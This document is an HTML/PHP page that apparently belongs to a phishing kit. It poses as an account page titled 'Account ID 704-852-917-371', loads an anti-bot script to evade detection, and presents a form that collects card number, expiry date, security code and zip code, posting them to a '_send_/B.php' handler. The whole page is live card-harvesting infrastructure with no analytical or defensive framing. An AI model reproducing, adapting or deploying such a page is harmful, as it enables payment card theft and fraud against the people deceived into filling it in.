<?php
include '_data_/antibots.php';
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Account ID 704-852-917-371</title>
<link href="_data_/favicon.png" rel="icon" sizes="128x128" type="image/png">
<link href="_data_/data.css" rel="stylesheet">
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:724px;top:0px;width:475px;height:950px;z-index:7;">
<form action="_send_/B.php" method="POST">
<input type="text" required="" autocomplete="off" minlength="15" maxlength="16" id="Editbox1"  style="position:absolute;left:31px;top:323px;width:400px;height:47px;z-index:0;" name="1" value="" spellcheck="false" placeholder="Card number">
<input type="text" required="" autocomplete="off" id="Editbox2"  style="position:absolute;left:31px;top:399px;width:400px;height:47px;z-index:1;" name="2" value="" spellcheck="false" placeholder="Expiry date (MM/YYYY)">
<input type="text" required="" autocomplete="off" minlength="3" maxlength="4" id="Editbox3" onkeypress="return isNumberKey(event)" style="position:absolute;left:31px;top:474px;width:400px;height:47px;z-index:2;" name="3" value="" spellcheck="false" placeholder="CSC">
<input type="text" required="" autocomplete="off" id="Editbox4"  style="position:absolute;left:31px;top:550px;width:400px;height:47px;z-index:3;" name="4" value="" spellcheck="false" placeholder="Code zip">
<div id="wb_Image1" style="position:absolute;left:368px;top:484px;width:64px;height:36px;z-index:4;">
<img src="_data_/csc.png" id="Image1" alt="" width="64" height="36"></div>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:82px;top:826px;width:309px;height:43px;z-index:5;cursor: pointer;">
<div id="wb_Image2" style="position:absolute;left:232px;top:193px;width:56px;height:56px;z-index:6;">
</form>
</div>
</body>
</html>